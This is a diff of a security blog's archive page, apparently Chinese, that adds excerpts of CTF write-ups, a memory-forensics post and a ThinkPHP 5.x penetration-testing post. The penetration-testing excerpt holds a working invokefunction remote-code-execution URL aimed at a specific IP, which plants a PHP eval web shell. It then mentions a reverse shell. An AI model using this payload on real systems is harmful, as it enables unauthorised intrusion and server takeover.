@@ -341,6 +341,134 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/33972/">
+            
+                <span>otter-ctf</span>
+        </a>
+        <div class="abstract-content">
+            OTRhttps://github.com/nytr0gen/otterctf-2018-writeup#otr-1---find-the-lutra
+
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/16</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/21890/">
+            
+                <span>内存取证分析</span>
+        </a>
+        <div class="abstract-content">
+            Otter-CTF 内存取证分析下载地址：https://mega.nz/#!sh8wmCIL!b4tpech4wzc3QQ6YgQ2uZnOmctRZ2duQxDqxbkWYipQ
+mega这个平台看起来也不错。
+prepare
+查看内存镜像的信息
+
+12345678910111213141516ht@TIANJI:/mnt/c/Users/HT/Desktop/OtterCTF$ volatility -f OtterCTF.vmem imageinfoVolatility Foundation Volatility Framework 2.5INFO    : volatility...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/16</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/49664/">
+            
+                <span>xmasctf</span>
+        </a>
+        <div class="abstract-content">
+            pinkie’s gift1234567891011121314151617181920212223242526from pwn import *debug = int(raw_input(&quot;debug?:&quot;))if debug:    p = process(&quot;./pinkiegift&quot;)    context.log_level = &quot;debug&quot;else:    p = remote(&quot;95.179.163.167&quot;, 10006)p.recvuntil(&quot;Santa: &quot;)bins...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/15</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/58144/">
+            
+                <span>tp5.x渗透测试</span>
+        </a>
+        <div class="abstract-content">
+            142.93.198.170
+写入shell
+1http://142.93.198.170/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%20%3E%20./uploads/20180403/error.php
+
+上菜刀
+
+为了方便敲命令，反弹shell
+1python -c &quot;imp...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/11</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/11772/">
+            
+                <span>hxp-ctf</span>
+        </a>
+        <div class="abstract-content">
+            Webunpacker123456789101112131415161718192021&lt;?phpif (isset($_FILES[&apos;zip&apos;]) &amp;&amp; $_FILES[&apos;zip&apos;][&apos;size&apos;] &lt; 10*1024 )&#123;    $d = &apos;files/&apos; . bin2hex(random_bytes(32));    mkdir($d) || die(&apos;mkdir&apos;);    chdir($d) || die(&apos;chdir&apos;)...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/10</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/31116/">
             
                 <span>ctf题目-php调试分析</span>
@@ -486,151 +614,10 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/48844/">
-            
-                <span>bctf2018</span>
-        </a>
-        <div class="abstract-content">
-            Webcheckin输入不存在的网址时，提示网站采用beego1.7.2。而最新版的beego是1.10.0。
-在beego官网，https://beego.me/docs/intro/releases.md，并没有看到beego1.7.2。这时候，到git下载源代码，查找commit log，寻找beego1.7.2到1.10.0之间可能存在的漏洞修复。
-1234567891011121314151617181920212223242526commit 8391d26220d380b9c084ee425af0d3ba30dcc3abMerge: f64e6b7 9865779Autho...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/29</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/59263/">
-            
-                <span>安全设备名词解释</span>
-        </a>
-        <div class="abstract-content">
-            防火墙交换机路由器堡垒机
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="安全体系建设">安全体系建设</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/23961/">
-            
-                <span>安全域划分的相关问题</span>
-        </a>
-        <div class="abstract-content">
-            须知:原则一切皆不可信安全域简介安全域是指同一系统内有相同的安全保护需求，相互信任，并具有相同的安全访问控制和边界控制策略的子网或网络，相同的网络安全域共享一样的安全策略。相对以上安全域的定义，广义的安全域概念是指：具有相同和相似的安全要求和策略的IT要素的集合。这些IT要素包括但不仅限于：物理环境、策略和流程、业务和使命、人和组织、网络区域、主机和系统……
-安全域划分通常来说，安全域可以划分为如下几个层次:
-
-建议的划分方法是立体的，即：各个域之间不是简单的相交或隔离关系，而是在网络和管理上有不同的层次。
-网络基础设施域是所有域的基础，包括所有的网络设备和网络通讯支撑设施域。网络基础设...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="安全体系建设">安全体系建设</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/16617/">
-            
-                <span>code-breaking</span>
-        </a>
-        <div class="abstract-content">
-            function123456789&lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;    show_source(__FILE__);&#125; else &#123;    $action(&apos;&apos;, $arg);&#125;
-随便测试了一下啊，发现加函数名中加\可以继续执行方法。
-12...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/25</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/3376/">
-            
-                <span>lctf-2018</span>
-        </a>
-        <div class="abstract-content">
-            WebTravel源码1234567891011121314151617181920212223242526272829303132333435363738394041# -*- coding: utf-8 -*-from flask import request, render_templatefrom config import create_appimport osimport urllibimport requestsimport uuidapp = create_app()@app.route('/upload/&lt;filename&gt;', methods = ['PU...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/19</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/2018/page/2/">2</a><a class="page-number" href="/archives/2018/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2018/page/7/">7</a><a class="extend next" rel="next" href="/archives/2018/page/2/">NEXT &#62;</a>
+        <span class="page-number current">1</span><a class="page-number" href="/archives/2018/page/2/">2</a><a class="page-number" href="/archives/2018/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2018/page/8/">8</a><a class="extend next" rel="next" href="/archives/2018/page/2/">NEXT &#62;</a>
     </nav>
     
 </main>
@@ -1804,9 +1791,176 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 71
+        Total : 76
         </div>
         <!-- search  -->
         
@@ -1833,6 +1987,31 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/33972/">otter-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/posts/21890/">内存取证分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href="/posts/49664/">xmasctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href="/posts/58144/">tp5.x渗透测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href="/posts/11772/">hxp-ctf</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1901,12 +2080,12 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
         </li>
     
     
@@ -1996,12 +2175,12 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
@@ -2121,12 +2300,12 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
@@ -2189,25 +2368,25 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
-        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
-    
         <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
-        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
-    
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -2219,9 +2398,9 @@ PwnSstation Escape1234567My treasure is yours for the taking, But you&apos;ll ha
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
-        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
-    
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
